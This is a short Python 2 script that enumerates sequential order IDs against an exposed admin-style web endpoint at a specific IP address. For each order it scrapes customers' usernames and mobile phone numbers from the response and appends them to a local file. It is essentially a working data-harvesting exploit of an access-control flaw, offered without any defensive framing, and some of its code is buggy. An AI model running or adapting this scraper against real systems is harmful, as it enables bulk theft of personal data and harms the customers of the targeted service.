import threadpool
import requests
import re
import os
import sys

THREAD = 5
RESULT_FILE = "result.txt"

def start(orderId):
	try:
		resultHtml = requests.get("http://121.199.72.197:8787/ws_test/conf/method_getServiceData.action?methodId=getOrderAdmin&orderId={0}&queryType=0".format(orderId)).text;
	except ConnectionError:
		print "Connection aborted"
	return {"html":resultHtml,"orderId":orderId}

def processingResults(request,resultDict):
	try:
		FILE.write("{0} - {1}".format("username",re.findall("<userName>(.*)</userName>",resultDict['html'])[0].encode("utf-8").join(os.linesep)));
		FILE.write("{0} - {1}".format("mobilePhone",re.findall("<mobilePhone>(.*)</mobilePhone>",resultDict['html'])[0].encode("utf-8").join(os.linesep)));
		FILE.write("-------".join(os.linesep))
	except IndexError:
		print "{0} - not found".format(resultDict['orderId'])
	
if len(sys.argv) < 3:
	print 'usage:  python work.py <orderIdStart> <orderIdStop>'
	print 'demo:   python wordk.py 686469 686472'
	exit()

FILE = open(RESULT_FILE,"a");
pool = threadpool.ThreadPool(THREAD)
reqs = threadpool.makeRequests(start,range(int(sys.argv[1]),int(sys.argv[2])),processingResults)
[pool.putRequest(req) for req in reqs]
pool.wait()
FILE.close()